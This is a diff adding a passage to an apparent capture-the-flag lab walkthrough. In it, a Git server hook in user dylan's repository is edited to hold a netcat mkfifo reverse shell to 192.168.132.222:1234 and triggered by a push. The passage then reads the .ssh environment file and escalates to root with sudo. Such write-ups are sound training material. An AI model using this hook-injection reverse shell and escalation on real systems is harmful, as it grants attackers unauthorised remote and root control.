@@ -1329,11 +1329,85 @@ Go to proxy settings --> Match and replace --> In replace add Authorization: Bas
 
 ![enum result](70.png)
 
+We get this Site Administration
 
+![[Pasted image 20260215220051.png]]
 
+In dylan's repo, Click on Settings -> Git hooks
 
+In this I found a script so let us change this script 
 
+We will add a bash reverse shell and run this to get a reverse shell access
 
+```
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+```
+
+![[Pasted image 20260215222204.png]]
+
+After !/bin/sh add
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.222 1234 >/tmp/f
+```
+
+Add this and click update
+
+Now we will go to our test repo
+
+Now in dylan's shell
+
+```
+cd /tmp
+```
+
+```
+git clone http://localhost:3000/Dylan/Test-Repo.git
+```
+
+```
+cd Test-Repo
+```
+
+```
+ls -la
+```
+
+![[Pasted image 20260215222743.png]]
+
+Now we will update README.md file, push our update to have our reverse shell access
+
+![[Pasted image 20260215223324.png]]
+
+![[Pasted image 20260215223310.png]]
+
+![[Pasted image 20260215223414.png]]
+
+![[Pasted image 20260215223438.png]]
+
+After this we get our reverse shell 
+
+```
+cd .ssh
+```
+
+```
+ls -la
+```
+
+```
+cat environment
+```
+
+```
+sudo -l
+```
+
+```
+sudo su
+```
+
+Now we are root
 
 ## 9. BookStore
 
